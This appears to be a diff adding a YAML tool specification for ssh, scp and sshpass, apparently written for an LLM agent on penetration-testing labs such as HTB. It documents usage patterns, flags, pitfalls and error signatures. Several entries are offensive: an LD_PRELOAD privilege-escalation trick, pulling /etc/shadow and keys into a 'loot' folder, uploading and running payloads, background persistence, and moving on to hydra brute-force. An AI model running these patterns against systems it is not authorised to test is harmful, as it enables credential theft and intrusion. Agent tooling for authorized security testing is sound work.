+    when: "Privesc trick: inject LD_PRELOAD or PYTHONPATH before invoking a SUID / privileged binary. Only works if (a) the binary doesn't strip env vars, (b) the agent has write access to the .so / .py path. Common against poorly-configured sudo entries."
+
+  # ── scp: file copy ──
+  - name: "scp — download a file from target"
+    binary: "scp"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {user}@{host}:/etc/passwd /session/loot/passwd"
+    when: "Pull a single text file (config, /etc/passwd, /etc/shadow, ssh keys, flags) from the target into /session/loot/. Path on remote follows the colon. Local destination is the second positional. The legacy `copy_from` method did this with a temp file then read its content — under run_cli the file lands directly in /session/."
+
+  - name: "scp — download with custom port"
+    binary: "scp"
+    command: "-P {port} -i /session/id_rsa -o StrictHostKeyChecking=no {user}@{host}:/path/to/remote /session/local"
+    when: "Same as the previous pattern but with non-standard SSH port. NB: scp uses CAPITAL -P for port (ssh uses LOWERCASE -p). Common typo: -p sets preserve-perms (boolean) and the next argv (which should be the port number) is misread as the source/dest."
+
+  - name: "scp — upload a file to target"
+    binary: "scp"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /session/payload.sh {user}@{host}:/tmp/payload.sh"
+    when: "Push a script / payload / binary from /session/ to the target. The legacy `copy_to` method took raw content and wrote it to a temp file first; under run_cli the file is already in /session/."
+
+  - name: "scp — upload directory recursively"
+    binary: "scp"
+    command: "-r -i /session/id_rsa -o StrictHostKeyChecking=no /session/exploit-tree {user}@{host}:/tmp/"
+    when: "Recursively copy a directory tree (e.g., a multi-file exploit). -r is required for directories; without it scp errors with 'omitting directory'."
+
+  - name: "scp + sshpass — password-auth file copy"
+    binary: "sshpass"
+    command: "-p '{password}' scp -o StrictHostKeyChecking=no /session/payload.sh {user}@{host}:/tmp/"
+    when: "Password-authenticated file upload. Same sshpass + scp wrapping as ssh + sshpass."
+
+  # ── ssh: special-case patterns ──
+  - name: "ssh — jump host (one-shot ProxyJump)"
+    binary: "ssh"
+    command: "-i /session/id_rsa -J {jump_user}@{jump_host} -o StrictHostKeyChecking=no -T {user}@{target_host} 'whoami'"
+    when: "Connect to {target_host} via {jump_host}. -J is supported in one-shot ssh (the jump connection is opened and closed within this single ssh process — no persistent state). Use when target is in a private subnet reachable only through a bastion host."
+
+  - name: "ssh — base64 binary upload via stdin"
+    binary: "ssh"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'base64 -d > /tmp/payload && chmod +x /tmp/payload'"
+    when: "Upload a binary file via stdin: pipe the base64-encoded bytes into the ssh stdin and let the remote shell decode + write. The legacy `upload_binary` method did this in 50KB chunks via `echo CHUNK | base64 -d >> file` per call — under run_cli the LLM either uses scp (cleaner) OR streams via cli_in_container's stdin support. See gotchas for chunk-vs-stream tradeoffs."
+
+  - name: "ssh — upload-and-execute script in one shot"
+    binary: "ssh"
+    command: "-i /session/id_rsa -o StrictHostKeyChecking=no -T {user}@{host} 'cat > /tmp/script.sh && chmod +x /tmp/script.sh && /tmp/script.sh; rm -f /tmp/script.sh'"
+    when: "Streamline of the legacy `run_script` method: pipe the script content via cli_in_container's stdin → remote `cat > file` → exec → remove. Single SSH connection. Useful for short enum scripts. For larger scripts, prefer scp upload + ssh exec as two separate calls."
+
+  # ── help / version (target=null) ──
+  - name: "ssh — help"
+    binary: "ssh"
+    command: "-h"
+    when: "Print ssh's usage banner and short flag list. target=null. Safe self-test for the container."
+
+  - name: "scp — help"
+    binary: "scp"
+    command: "-h"
+    when: "Print scp's usage banner. target=null. NB: scp's flag set is smaller than ssh's; help fits on one screen."
+
+  - name: "sshpass — help"
+    binary: "sshpass"
+    command: "-h"
+    when: "Print sshpass's usage. target=null. sshpass help is 5 lines: -p, -f, -d, -e, -v."
+
+  - name: "ssh — version"
+    binary: "ssh"
+    command: "-V"
+    when: "Print OpenSSH client version (e.g., 'OpenSSH_10.2p1 Debian-1, OpenSSL 3.0.x'). target=null. NB: -V output goes to STDERR, not stdout — capture stderr if parsing."
+
+output_formats:
+  - flag: ""
+    format: "text"
+    preferred: true
+    notes: "Default: ssh prints whatever the remote command produces on stdout; scp prints brief progress on stderr (or nothing under -q); sshpass adds nothing of its own."
+  - flag: "-q"
+    format: "quiet_text"
+    preferred: false
+    notes: "ssh / scp -q: suppress non-essential output (progress bar, warnings). Useful for clean parsing."
+  - flag: "-v / -vv / -vvv"
+    format: "verbose_to_stderr"
+    preferred: false
+    notes: "ssh: verbose handshake / auth / channel setup to stderr. Useful for diagnostics; the agent should redirect stderr to a separate log file or accept that stderr will be polluted."
+  - flag: "-G"
+    format: "ssh_effective_config"
+    preferred: false
+    notes: "ssh -G: print the effective config (after -o overrides + ~/.ssh/config + /etc/ssh/ssh_config) without connecting. Useful for verifying a -o flag took effect."
+
+common_options:
+  ssh_targeting:
+    - "POSITIONAL: [user@]host (after all flags). The [user@] prefix is optional; without it ssh defaults to the local username (typically 'root' inside cli_in_container)."
+    - "-l USER: alternate way to specify user (ssh -l user host). Less common than user@host."
+    - "host alone (no user@) accepted: e.g., 'ssh 10.10.10.5 cmd' — uses default user."
+  ssh_auth:
+    - "-i KEY: private key path. Default key search: ~/.ssh/id_rsa, id_ed25519, etc. Always pass -i explicitly under cli_in_container."
+    - "-o IdentitiesOnly=yes: force ssh to use ONLY the -i key (ignore agent / default keys). Critical when /session/ has multiple keys."
+    - "-o IdentityFile=KEY: alternate spelling of -i (key path)."
+    - "-o PreferredAuthentications=publickey: force key-only auth (skip password prompt)."
+    - "-o PasswordAuthentication=no: refuse password auth (exit fast on key failure instead of prompting)."
+    - "sshpass -p PASS / -e (SSHPASS env) / -f FILE: inject password for password-auth servers."
+  ssh_connection:
+    - "-p PORT: ssh remote port (LOWERCASE p — common typo: confused with scp -P or sshpass -p)."
+    - "-o ConnectTimeout=N: TCP connect timeout in seconds (default ~120s; set to 10 for fast triage)."
+    - "-o ServerAliveInterval=N -o ServerAliveCountMax=M: keepalives (default off; set N=15 M=3 to drop dead connections in 45s)."
+    - "-o BatchMode=yes: refuse interactive prompts; fail fast if a credential / host-key prompt would appear. Always set when using -i without an agent."
+    - "-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null: LAB-ONLY pair — skip first-connection prompts and don't pollute the user's known_hosts."
+  ssh_proxy:
+    - "-J [user@]host[:port][,...]: jump host(s) — chain through a bastion (one-shot ProxyJump). One-shot ProxyJump is fine; multi-hop persistent tunnels are NOT in scope (use the tunnel tool)."
+  scp_targeting:
+    - "POSITIONAL: SOURCE DEST. One or both can be [user@]host:path. The colon separates host from path; everything after the colon is the remote path (which can contain colons of its own — quote carefully)."
+  scp_options:
+    - "-P PORT: scp remote port (CAPITAL P)."
+    - "-i KEY: scp private key (same as ssh)."
+    - "-r: recursive directory copy."
+    - "-3: route via localhost (host A → local → host B; useful when A and B can't reach each other directly)."
+    - "-O: use legacy SCP protocol (vs SFTP). OpenSSH 9+ defaults to SFTP; old / embedded servers may only speak SCP and need -O explicitly."
+  sshpass_options:
+    - "-p PASS: password value on command line (visible in `ps`)."
+    - "-e: read password from SSHPASS env var (cleaner audit trail)."
+    - "-f FILE: read password from file (avoids quoting issues)."
+    - "-d FD: read password from file descriptor (default FD 3)."
+
+gotchas:
+  - "MULTI-BINARY toolkit. Pick the right binary per task: `ssh` (one-shot remote command), `scp` (file copy), `sshpass` (wrap ssh/scp for password auth). Each usage_pattern declares `binary:` explicitly. cli_in_container forwards the chosen binary; there is NO top-level `binary:` field."
+  - "`-p` MEANS THREE DIFFERENT THINGS across the three binaries. ssh -p = REMOTE PORT (integer); scp -p = PRESERVE PERMS (boolean); sshpass -p = PASSWORD (string). Same letter, totally different semantics. The cli_in_container parser is binary-scoped — at parse time the binary is fixed, so the same letter is unambiguous within scope. The HUMAN-side risk is typing -p for port in scp (you want -P) or for password in ssh (you want sshpass -p)."
+  - "STATEFUL FLAGS REJECTED: -L (local fwd), -R (remote fwd), -D (SOCKS), -N (no command), -W (forward host), -M (control master), -S (control socket), -O (control commands). These all need a long-running ssh process to be useful; cli_in_container's one-shot model can't keep them alive. Use the `tunnel` (kind:mcp) tool instead. NB: scp -O has a different meaning (legacy SCP protocol) and is unaffected — reject_flags are binary-scoped."
+  - "ALWAYS use `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` in HTB / lab engagements. Without these, ssh prompts on first connection ('The authenticity of host ... can't be established. Are you sure you want to continue connecting (yes/no)?'); cli_in_container has no TTY, so the call HANGS until idle_timeout. SAME for ssh's interactive password prompt — always pair credential auth with sshpass / -i + BatchMode=yes to avoid hangs."
+  - "ALWAYS use `-T` to disable PTY allocation. cli_in_container has no TTY; without -T, ssh either complains ('Pseudo-terminal will not be allocated...') or, worse, succeeds but produces ANSI color codes / readline gibberish in stdout. -T forces non-interactive mode and produces clean stdout."
+  - "PRIVATE KEY FILE PERMISSIONS. ssh refuses to use a key with permissions broader than 0600 ('WARNING: UNPROTECTED PRIVATE KEY FILE'). Two workarounds: (a) chmod 600 the key in /session/ before invoking ssh (cli_in_container should do this automatically when the write tool stages the key); (b) use `-o IdentitiesOnly=yes` which sometimes bypasses the check. If neither works, the key file's UID may not match the cli_in_container user — check with `ls -la`."
+  - "OPENSSH 10.x DROPS LEGACY ALGORITHMS. ssh-rsa keys, diffie-hellman-group14-sha1 KEX, and 3des-cbc cipher are NO LONGER ENABLED by default in OpenSSH 10. Connecting to old CentOS 6 / Cisco IOS / embedded servers requires re-enabling: `-o KexAlgorithms=+diffie-hellman-group14-sha1 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa`. Symptom: 'Unable to negotiate with HOST: no matching host key type found' or 'no matching key exchange method'."
+  - "OPENSSH-FORMAT PRIVATE KEYS. Modern ssh-keygen emits keys in OPENSSH format (`-----BEGIN OPENSSH PRIVATE KEY-----`); some libraries / tools want PEM (`-----BEGIN RSA PRIVATE KEY-----`). The legacy mcp-server.py auto-converted via `ssh-keygen -p -m PEM`. Under run_cli, the LLM must do this explicitly if the conversion is needed. ssh ITSELF accepts both formats, so most calls don't need conversion."
+  - "BACKGROUND PROCESSES need `nohup ... &` AND `disown` AND output redirection. Without all three, the process dies when SSH closes the channel: nohup ignores SIGHUP; & runs in background; disown removes the job from the shell's job table; output redirection (`>file 2>&1` or `>/dev/null 2>&1`) detaches stdio. Echo a sentinel ('BACKGROUND_STARTED') so the agent confirms the launch happened. The legacy `background` method wrapped this; under run_cli the LLM constructs the chain."
+  - "`ssh user@host 'echo data | base64 -d > /tmp/file'` for binary-via-stdin uploads has SIZE LIMITS. Most shells refuse argv > ~128KB (ARG_MAX). For larger binaries: use scp (preferred), or chunk the base64 (the legacy upload_binary method did 50KB chunks). cli_in_container's stdin support also lets you pipe the bytes via stdin without shell argv expansion."
+  - "scp's `-O` (capital O) means LEGACY-SCP-PROTOCOL. OpenSSH 9+ defaults to SFTP-over-ssh for scp; old servers (Solaris, AIX, embedded) only speak the legacy SCP protocol and need -O explicitly. Symptom: 'subsystem request failed on channel 0' from the server, or 'sh: scp: not found' (when only `scp` legacy binary exists, no SFTP subsystem)."
+  - "SSH ENV VAR PASSTHROUGH IS LIMITED. Most servers' /etc/ssh/sshd_config has `AcceptEnv LANG LC_*` and refuses arbitrary env. To pass an env var to the remote command, EITHER (a) inline it in the command string (`ssh host 'X=1 cmd'`), OR (b) request it via `-o SendEnv=X` AND ensure the server has `AcceptEnv X`. Don't assume `ENV=val ssh ...` reaches the remote process."
+  - "`shell-session` (kind:mcp) IS THE RIGHT TOOL for PERSISTENT multi-command SSH sessions. This `ssh` tool opens a FRESH connection per call — every invocation starts from $HOME with no shell state (cd / env / set -x are reset). If the agent finds itself running 4+ ssh calls in a row against the same host with related state, pivot to shell-session for ONE persistent session. Each fresh connection also burns a few seconds on TCP+KEX+auth — slow for chatty workflows."
+  - "TUNNELS ARE FORBIDDEN HERE. -L, -R, -D, -N, -W are rejected (see reject_flags). Use the `tunnel` (kind:mcp) tool for SSH-based port forwarding / SOCKS / dynamic forwards. cli_in_container can't host a long-running ssh process; the connection terminates as soon as run_cli returns, killing any tunnel."
+  - "JUMP HOST IS OK ONE-SHOT. `-J [user@]bastion[:port]` is acceptable: the jump connection is established and torn down within ONE ssh process. Multi-hop persistent jumps (where you'd want the bastion connection to stay open across many target connections) are NOT supported here — use a control-master + tunnel pattern via the `tunnel` tool."
+  - "PASSWORD ON COMMAND LINE = AUDIT-LOG EXPOSURE. sshpass -p PASS puts the password in `ps` output and in cli_in_container's audit log. Three lower-exposure forms: -e (SSHPASS env), -f FILE (password file), -d FD (file descriptor). For HTB / labs the exposure is harmless; for real engagements with audit-trail concerns, use -e or -f."
+  - "Feature 28 dynamic recipes are RETIRED for the kind:cli path — the LLM writes argv directly. Recipes still load for legacy method calls (exec, shell, copy_from, copy_to, upload_binary, run_script, background) if /session/tool_recipes/ssh/ exists, but they're a dead branch under run_cli (REQ-TR-016)."
+  - "TRANSIENT FAILURE RETRY IS MANUAL UNDER kind:cli. The legacy mcp-server.py auto-retried (with exponential backoff `2 * attempt` seconds) on `connection timed out`, `connection reset by peer`, and `network is unreachable`. Under run_cli there is NO auto-retry — the LLM must observe the failure_signature, sleep, and re-emit the call. Common pattern: first attempt fails with `connection reset` → wait 2-4s → retry. After 2-3 retries with the same transient error, treat as a hard failure (rate limit, sshd MaxStartups, fail2ban) and pivot."
+  - "ROBUST CONNECTION DEFAULTS (legacy parity). The legacy mcp-server.py always added `-o ServerAliveInterval=15 -o ServerAliveCountMax=3 -o TCPKeepAlive=yes` to every ssh invocation. Under run_cli these are NOT auto-added. For commands that are expected to take >30s (long-running enum, big scp transfer over flaky tun0 / VPN), include them explicitly to drop dead connections in ~45s instead of waiting for the kernel TCP timeout. Also pair with `-o BatchMode=yes` (when using -i without sshpass) to fail fast on credential-prompt-would-have-appeared paths."
+  - "OPENSSH 10.x POST-QUANTUM HANDSHAKE WARNINGS pollute stderr. OpenSSH 10 emits banner-style warnings (lines starting `Warning:` or `** `) about post-quantum KEX during the handshake; the legacy mcp-server.py FILTERED these out of error reporting. Under run_cli they appear in stderr verbatim and may confuse failure-signature matching. Heuristic: when classifying an ssh failure, ignore stderr lines starting with `Warning:`, `Permanently added`, or `** ` — these are informational, not errors. The exit code is still authoritative."
+  - "BINARY UPLOAD VIA SSH+ECHO+BASE64 NEEDS A 4-STEP CHAIN. The legacy `upload_binary` method did: (1) `rm -f /tmp/payload` to clear stale content, (2) per-chunk `echo CHUNK_B64 | base64 -d >> /tmp/payload` (50KB chunks before base64), (3) `chmod +x /tmp/payload` if executable, (4) verify with `ls -la /tmp/payload && file /tmp/payload`. Skipping step 1 corrupts when retrying after a partial failure; skipping step 4 hides truncation. Under run_cli, prefer scp; only fall back to chunked echo+base64 when scp is blocked (no SFTP subsystem, restricted shell, etc.)."
+  - "BACKGROUND PROCESS PID CAPTURE has a TIMING GOTCHA. The legacy `background` method ran `nohup bash -c '...' >output 2>&1 & echo $! > /tmp/pid && disown && sleep 0.2 && cat /tmp/pid` — the `sleep 0.2` lets the shell write the PID file BEFORE the cat reads it (without it, races on slow targets). Use the same chain under run_cli when you need the PID. If you only need fire-and-forget, the simpler `nohup ... & disown && echo BACKGROUND_STARTED` (already in usage_patterns) is enough."
+
+failure_signatures:
+  # Layer-diverse signals (SKILL #11) — at least 7 distinct verifiable layers:
+  #   1. DNS                  (resolution failure before TCP)
+  #   2. TCP                  (connect failure / refused / timed out / no route)
+  #   3. Host key             (StrictHostKeyChecking refusal / changed key)
+  #   4. Auth                 (publickey / password rejection)
+  #   5. Key file             (UNPROTECTED PRIVATE KEY / invalid format)
+  #   6. Argument / argparse  (unknown option, missing value)
+  #   7. SCP/SSH protocol     (legacy SCP missing, subsystem failed)
+  #   8. Sshpass-specific     (sshpass invocation errors)
+  #
+  # Verified against:
+  #   - OpenSSH 10.2p1 on Kali rolling (2026-04)
+  #   - sshpass 1.10
+
+  # ── 1. DNS layer ──
+  - signal: "Could not resolve hostname"
+    remediation: "DNS lookup failed. Check the hostname spelling, verify /etc/hosts inside the container has the mapping (HTB targets often need a manual entry), or use the IP directly. NB: cli_in_container may not reach external DNS — it relies on the host's /etc/resolv.conf."
+  - signal: "Name or service not known"
+    remediation: "libc / getaddrinfo phrasing variant of the same DNS-resolution failure. Same fix."
+  - signal: "Temporary failure in name resolution"
+    remediation: "DNS server unreachable / timing out. Check network egress; on tun0 / VPN the DNS may be on the VPN side and require routing. Use the IP directly to bypass DNS."
+
+  # ── 2. TCP layer ──
+  - signal: "Connection refused"
+    remediation: "TCP RST on port 22 (or -p PORT). Service not listening, OR firewall returning RST instead of dropping. Verify with `nmap -p 22 HOST` first; if nmap shows filtered, the firewall is dropping packets (different signal — see 'Connection timed out')."
+  - signal: "Connection timed out"
+    remediation: "TCP connect timeout — packet dropped (firewall) or host unreachable. Increase -o ConnectTimeout if the network is just slow, but most often this means the port is firewalled. Verify with nmap."
+  - signal: "No route to host"
+    remediation: "Local routing table has no path to the target IP. On HTB / VPN, this usually means tun0 is down or the engagement scope IP doesn't match the actual VPN range. Check `ip route` and the VPN connection."
+  - signal: "Network is unreachable"
+    remediation: "Local interface for the destination's network is down. Often the same root cause as 'No route to host'."
+  - signal: "Connection reset by peer"
+    remediation: "TCP RST mid-connection. May be rate-limiting (sshd's MaxStartups / fail2ban / cowrie honeypot dropping you), or a firewall closing established connections. Backoff and retry; if persistent, switch to a different source IP if available."
+  - signal: "Connection closed by"
+    remediation: "Server closed the SSH connection cleanly (often after auth failure or after sshd's LoginGraceTime expires without auth completion). Check the message that follows for the cause."
+  - signal: "Broken pipe"
+    remediation: "TCP connection broke mid-transfer (often during scp of a large file over a flaky network). Retry; for large transfers consider chunking or using rsync (separate tool)."
+
+  # ── 3. Host key layer ──
+  - signal: "Host key verification failed"
+    remediation: "ssh's known_hosts entry for this host doesn't match the server's current host key. Either the host key legitimately changed (server reinstall, key rotation) or you're being MITM'd. For HTB / labs ALWAYS pass `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` to bypass; for real engagements verify the new key out-of-band before connecting."
+  - signal: "REMOTE HOST IDENTIFICATION HAS CHANGED"
+    remediation: "ssh's full warning when a known_hosts entry mismatches. Same fix as 'Host key verification failed' — but READ this one carefully: a real key change is a security event in production. For HTB targets, ignore + bypass."
+  - signal: "Are you sure you want to continue connecting"
+    remediation: "ssh's first-connection prompt asking to add the host to known_hosts. cli_in_container has no TTY, so this HANGS until idle_timeout_seconds. Always pass `-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null` (LAB-ONLY) or `-o StrictHostKeyChecking=accept-new` (auto-accept first connection but still detect future changes)."
+  - signal: "no matching host key type found"
+    remediation: "OpenSSH 10.x dropped legacy ssh-rsa / ssh-dss host key types by default. Re-enable with `-o HostKeyAlgorithms=+ssh-rsa,+ssh-dss`. Also check `ssh -Q HostKeyAlgorithms` to see what your client supports."
+  - signal: "no matching key exchange method"
+    remediation: "Server only speaks legacy KEX algorithms that OpenSSH 10.x has dropped. Re-enable with `-o KexAlgorithms=+diffie-hellman-group14-sha1,+diffie-hellman-group1-sha1`. Common against old Cisco IOS, Solaris, and embedded devices."
+  - signal: "no matching cipher found"
+    remediation: "Server only speaks legacy ciphers (3des-cbc, blowfish-cbc) that OpenSSH 10.x has dropped. Re-enable with `-o Ciphers=+3des-cbc,+aes128-cbc`."
+
+  # ── 4. Auth layer ──
+  - signal: "Permission denied (publickey)"
+    remediation: "Server rejected your key — either the key isn't authorized for this user, or the key file is corrupt / wrong format. Verify with `ssh-keygen -y -f /session/id_rsa` (extracts the public key) and confirm it matches `~user/.ssh/authorized_keys` on the target."
+  - signal: "Permission denied (publickey,password)"
+    remediation: "Server offered both publickey and password methods; both failed. If you have a password, add `sshpass -p PASS`; if the key is wrong, find a different key. NB: with -o BatchMode=yes, ssh skips password fallback and reports this faster."
+  - signal: "Permission denied, please try again"
+    remediation: "Password auth attempted with wrong password (or the server prompts for password and ssh fails after MaxAuthTries). With sshpass, this means the password is wrong — try a different one or move to brute-force (hydra)."
+  - signal: "Too many authentication failures"
+    remediation: "ssh-agent has too many keys queued, OR you've exceeded the server's MaxAuthTries. Pass `-o IdentitiesOnly=yes` to force using ONLY the -i key (skip the agent's queue)."
+
+  # ── 5. Key file layer ──
+  - signal: "WARNING: UNPROTECTED PRIVATE KEY FILE"
+    remediation: "ssh refuses to use a key file with permissions broader than 0600. Workarounds: (a) `chmod 600 /session/id_rsa` before invoking ssh (the write tool should do this on file creation); (b) `-o IdentitiesOnly=yes` sometimes bypasses; (c) check the file's UID — if it doesn't match the container user, the chmod may not stick."
+  - signal: "Load key"
+    remediation: "ssh failed to load a key file. Common causes: file doesn't exist (`Load key \"/session/x\": No such file or directory`), wrong format (`Load key \"...\": invalid format`), encrypted key without passphrase (`Load key \"...\": incorrect passphrase`). Verify with `ls -la /session/` and `head -1 /session/id_rsa` (should be `-----BEGIN ... PRIVATE KEY-----`)."
+  - signal: "invalid format"
+    remediation: "Key file isn't recognizable as PEM, OPENSSH, or PKCS#8. May be a truncated download or wrong file. Re-download / re-extract; check first/last lines for the BEGIN/END markers."
+  - signal: "Bad permissions"
+    remediation: "Same as 'WARNING: UNPROTECTED PRIVATE KEY FILE' — file permissions broader than 0600. Chmod 600 the key."
+
+  # ── 6. Argument / argparse layer ──
+  - signal: "unknown option"
+    remediation: "ssh / scp / sshpass argparse rejected a flag. Check ssh / scp / sshpass `-h` for the correct spelling. Common: -p (sshpass) vs -P (scp port) vs -p (ssh port) confusion."
+  - signal: "command-line: line 0: Bad configuration option"
+    remediation: "ssh's `-o KEY=VAL` argparse error — KEY isn't a recognized config option. Check `ssh -G localhost` or `man ssh_config` for valid keys. Common typo: `-o StrictHostkeyChecking` (capital K wrong) vs `-o StrictHostKeyChecking` (correct CamelCase)."
+  - signal: "usage: ssh"
+    remediation: "Bare invocation or argparse fail printed the usage banner. Re-check the argv for missing required positional (host) or required value (-i without a key path)."
+  - signal: "usage: scp"
+    remediation: "Same as above for scp. Most common cause: missing source/dest positional, or scp invoked recursively without -r."
+
+  # ── 7. SCP/SSH protocol layer ──
+  - signal: "subsystem request failed on channel 0"
+    remediation: "Server doesn't support the requested subsystem (e.g., SFTP). For scp, OpenSSH 9+ uses SFTP by default — old servers (Solaris, AIX, embedded) need `-O` (capital O = legacy SCP protocol) explicitly."
+  - signal: "scp: not found"
+    remediation: "Remote host has no scp binary on PATH. Either the server is severely minimal (busybox without scp) OR scp was deliberately removed. Workarounds: use `ssh host 'cat > /tmp/file' < /local/file` (raw stdin upload) OR use sftp directly OR use rsync if available."
+  - signal: "lost connection"
+    remediation: "scp's phrasing for connection drops mid-transfer. Retry; for large files consider chunking or rsync."
+  - signal: "Pseudo-terminal will not be allocated"
+    remediation: "Stderr warning when ssh detects no local TTY but the remote command (or .bashrc) does TTY-only operations. Add `-T` to your ssh argv to suppress the warning AND prevent any TTY-sensitive remote behavior."
+
+  # ── 8. Sshpass-specific ──
+  - signal: "sshpass: Failed to run command"
+    remediation: "sshpass couldn't exec ssh / scp. Verify the wrapped command exists on PATH. Argv form is `sshpass [flags] ssh [args]` — sshpass execs argv[2:] with the password injected."
+  - signal: "sshpass: invalid option"
+    remediation: "Argparse error in sshpass's own flags. Run `sshpass -h` for the canonical set: -p, -f, -d, -e, -v."
+  - signal: "sshpass: Not enough arguments"
+    remediation: "sshpass invoked without the trailing ssh / scp command. Argv form: `sshpass [flags] COMMAND [args...]` — the COMMAND is required."
+
+help_commands:
+  - command: "ssh -h"
+    purpose: "ssh usage banner. Prints the short flag list and the [user@]host argument shape. Output goes to stderr (not stdout)."
+  - command: "ssh -V"
+    purpose: "OpenSSH client version (e.g., 'OpenSSH_10.2p1, OpenSSL 3.0.x'). NB: -V output goes to stderr, not stdout — capture stderr if parsing."
+  - command: "ssh -G localhost"
+    purpose: "Print the effective ssh config (after -o overrides + ~/.ssh/config + /etc/ssh/ssh_config) without connecting. Useful for verifying which Cipher / KEX / HostKeyAlgorithms are enabled."
+  - command: "ssh -Q cipher"
+    purpose: "List supported ciphers. Use `-Q kex / mac / key / sig` for other algorithm classes. Critical for diagnosing 'no matching ...' errors."
+  - command: "scp -h"
+    purpose: "scp usage banner. Smaller flag set than ssh."
+  - command: "sshpass -h"
+    purpose: "sshpass usage. Five flags: -p (password), -f (file), -d (FD), -e (SSHPASS env), -v (verbose)."
+
